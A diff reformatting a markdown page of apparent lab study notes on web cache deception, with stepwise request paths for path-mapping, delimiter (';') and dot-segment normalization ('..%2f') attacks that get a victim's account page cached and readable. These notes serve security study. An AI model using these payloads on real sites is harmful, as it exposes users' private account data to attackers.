@@ -35,24 +35,25 @@ Consider the following example:
 
 </details>
 
-<pre class="language-python"><code class="lang-python"># 1. Find good endpoint
+```python
+# 1. Find good endpoint
 /my-account        # Contains sensitive data -> Good endpoint
-<strong>
-</strong># 2. Check if web cache is used
+
+# 2. Check if web cache is used
 /test.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
 /test.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
-<strong>
-</strong><strong># 3. Check if origin server uses REST-style
-</strong><strong>/my-account/abc    # The response is identical to the original -> REST-style
-</strong><strong>
-</strong><strong># 4. Check if cache server uses traditional URL &#x26; explotation
-</strong>/my-account/abc.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
+
+# 3. Check if origin server uses REST-style
+/my-account/abc    # The response is identical to the original -> REST-style
+
+# 4. Check if cache server uses traditional URL & explotation
+/my-account/abc.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
 /my-account/abc.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
 # Now https://site.com/my-account/abc.js contains your sensitive data cached
 
 # Find a way to send the victim on http://site.com/my-account/xyz.js
 # Note: I omitted cache buster for for simplicity
-</code></pre>
+```
 
 {% hint style="info" %}
 **Note**:&#x20;
@@ -73,7 +74,8 @@ to do
 
 Objective: identify a character that is used as a delimiter by the origin server but not the cache. Use this list: [https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
 
-<pre class="language-python"><code class="lang-python"># 1. Find good endpoint
+```python
+# 1. Find good endpoint
 /my-account        # Contains sensitive data -> Good endpoint
 
 # 2. Check if web cache is used
@@ -89,13 +91,13 @@ Objective: identify a character that is used as a delimiter by the origin server
 # So the cache thinks "/my-account" is different from "/my-account;abc.js"
 
 # 5. Exploitation
-<strong>/my-account;abc.js # 1 time "X-Cache: miss"
-</strong>/my-account;abc.js # 2 time "X-Cache: hit"
+/my-account;abc.js # 1 time "X-Cache: miss"
+/my-account;abc.js # 2 time "X-Cache: hit"
 # Now https://site.com/my-account;abc.js contains your sensitive data cached
 
 # Find a way to send the victim on http://site.com/my-account;xyz.js
 # Note: I omitted cache buster for for simplicity
-</code></pre>
+```
 
 {% hint style="info" %}
 **Note**:&#x20;
@@ -120,17 +122,19 @@ Premise
 * If you type in your browser `https://website/test/../account`, it'll make the following request `GET /account HTTP/2`. &#x20;
 * If you type in your browser`https://website/test/..%2faccount`, it'll make the following request `GET /test/..%2faccount HTTP/2`. &#x20;
 
-<pre class="language-python"><code class="lang-python"># 1. Find good endpoint
+```python
+# 1. Find good endpoint
 /my-account            # Contains sensitive data -> Good endpoint
 
 # 2. Check if web cache is used (with static resources)
-<strong>/static/js/info.js     # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
-</strong>/static/js/info.js     # 2 time "X-Cache: hit" -> Perfect, the page is cached
-</code></pre>
+/static/js/info.js     # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
+/static/js/info.js     # 2 time "X-Cache: hit" -> Perfect, the page is cached
+```
 
 ### <mark style="color:purple;">Normalization by the origin server</mark> <a href="#exploiting-normalization-by-the-origin-server" id="exploiting-normalization-by-the-origin-server"></a>
 
-<pre class="language-python"><code class="lang-python"># 3. Confirm that the cache rule is based on the static directory
+```python
+# 3. Confirm that the cache rule is based on the static directory
 /static/../xxx         # 1 time "X-Cache: miss"
 /static/../xxx         # 2 time "X-Cache: hit" -> so all subpages in /static/ will be cached 
 
@@ -139,24 +143,25 @@ Premise
 
 # 5. Detecting normalization by the cache server
 /static/js/info.js     # 1 time "X-Cache: miss"
-<strong>/static/js%2finfo.js   # 2 time "X-Cache: miss" -> Cache isn't normalizing the path before mapping it to the endpoint
-</strong># So the cache thinks "/static/js/info.js" is different from "/static/js%2finfo.js"
+/static/js%2finfo.js   # 2 time "X-Cache: miss" -> Cache isn't normalizing the path before mapping it to the endpoint
+# So the cache thinks "/static/js/info.js" is different from "/static/js%2finfo.js"
 
 # 6. Exploiting
 /static/..%2fmy-account
 
 # The cache interprets the path as: /static/..%2fmy-account
-<strong># The origin server interprets the path as: /my-account
-</strong></code></pre>
+# The origin server interprets the path as: /my-account
+```
 
 ### <mark style="color:purple;">Normalization by the cache server</mark>
 
-<pre class="language-python"><code class="lang-python"># 3. Confirm that the cache rule is based on the static directory
+```python
+# 3. Confirm that the cache rule is based on the static directory
 # This step is useless, so you can't confirm if the cache decodes 
 # dot-segments and URL paths without trying an exploit.
-<strong>
-</strong><strong># 4. Detecting normalization by the origin server
-</strong>/aaa/..%2fmy-account   # Not found -> The origin server doesn't decode the slash and doesn't resolve the dot-segment
+
+# 4. Detecting normalization by the origin server
+/aaa/..%2fmy-account   # Not found -> The origin server doesn't decode the slash and doesn't resolve the dot-segment
 
 # 5. Detecting normalization by the cache server
 /static/js/info.js     # 1 time "X-Cache: miss"
@@ -177,4 +182,4 @@ Premise
 
 # The cache interprets the path as: /static
 # The origin server interprets the path as: /my-account
-</code></pre>
+```
